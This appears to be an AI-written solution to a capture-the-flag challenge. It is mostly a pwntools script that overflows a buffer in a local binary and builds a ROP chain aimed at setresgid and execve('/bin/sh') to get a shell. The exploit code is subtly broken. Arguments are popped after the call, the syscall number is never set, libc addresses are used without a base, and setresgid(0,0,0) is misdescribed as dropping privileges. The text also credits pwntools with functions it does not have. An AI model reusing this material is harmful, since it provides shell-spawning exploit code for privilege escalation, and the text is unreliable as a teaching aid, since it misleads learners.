To solve this challenge using `pwntools`, we need to exploit the buffer overflow in the `vulnerable_function` to achieve Return-Oriented Programming (ROP). The goal is to call `setresgid` with the effective group ID (EGID) to drop privileges and then execute a shell.

Here are the steps and the corresponding code:

### Steps:
1. **Identify the Buffer Overflow**: The `vulnerable_function` reads up to 256 bytes into a buffer of size 136, causing a buffer overflow.
2. **Find the Offset**: Determine the exact offset to overwrite the return address.
3. **Locate Gadgets**: Find useful gadgets in the binary or the linked libraries (libc).
4. **Build the ROP Chain**: Construct a ROP chain to call `setresgid` and then `execve` to spawn a shell.
5. **Exploit the Vulnerability**: Send the payload to the binary to execute the ROP chain.

### Code:

```python
from pwn import *

# Set up the context
context.binary = './rop'
elf = context.binary
libc = ELF('./libc.so.6')

# Start the process
p = process(elf.path)

# Find the offset to the return address
offset = cyclic_find(0x61616161)  # Replace with the actual offset found using cyclic pattern

# Find the addresses of the gadgets and functions
pop_ebx = next(elf.search(asm('pop ebx; ret')))
pop_ecx = next(elf.search(asm('pop ecx; ret')))
pop_edx = next(elf.search(asm('pop edx; ret')))
pop_eax = next(elf.search(asm('pop eax; ret')))
syscall = next(elf.search(asm('int 0x80')))

# Get the addresses of the functions in libc
setresgid_addr = elf.plt['setresgid']
execve_addr = libc.symbols['execve']
bin_sh_addr = next(libc.search(b'/bin/sh'))

# Build the ROP chain
rop = ROP(elf)
rop.raw(b'A' * offset)  # Padding to reach the return address
rop.raw(p32(setresgid_addr))  # Call setresgid
rop.raw(p32(pop_ebx))  # Pop the first argument (egid) into ebx
rop.raw(p32(0))  # egid = 0
rop.raw(p32(pop_ecx))  # Pop the second argument (rgid) into ecx
rop.raw(p32(0))  # rgid = 0
rop.raw(p32(pop_edx))  # Pop the third argument (sgid) into edx
rop.raw(p32(0))  # sgid = 0
rop.raw(p32(syscall))  # Make the syscall

# Call execve to spawn a shell
rop.raw(p32(execve_addr))  # Call execve
rop.raw(p32(pop_ebx))  # Pop the first argument (filename) into ebx
rop.raw(p32(bin_sh_addr))  # filename = "/bin/sh"
rop.raw(p32(pop_ecx))  # Pop the second argument (argv) into ecx
rop.raw(p32(0))  # argv = NULL
rop.raw(p32(pop_edx))  # Pop the third argument (envp) into edx
rop.raw(p32(0))  # envp = NULL
rop.raw(p32(syscall))  # Make the syscall

# Send the payload
p.sendline(rop.chain())

# Interact with the shell
p.interactive()
```

### Explanation:
1. **Context Setup**: We set up the context to use the binary and load the ELF and libc files.
2. **Offset Finding**: Use `cyclic_find` to determine the offset to the return address.
3. **Gadget Finding**: Use `next(elf.search(asm(...)))` to find the addresses of the gadgets needed for the ROP chain.
4. **Function Addresses**: Get the addresses of `setresgid` and `execve` from the PLT and libc, respectively.
5. **ROP Chain Construction**: Build the ROP chain to call `setresgid` with zero arguments to drop privileges, and then call `execve` to spawn a shell.
6. **Payload Sending**: Send the constructed payload to the binary.
7. **Interaction**: Interact with the shell spawned by the exploit.

### Note:
- Ensure you have the correct offset by using `pattern_create` and `pattern_offset` from `pwntools`.
- Adjust the addresses and offsets if they differ in your environment.
- This code assumes that ASLR is disabled or you have a way to leak addresses to bypass it. If ASLR is enabled, you will need to find a way to leak addresses to make the exploit reliable.
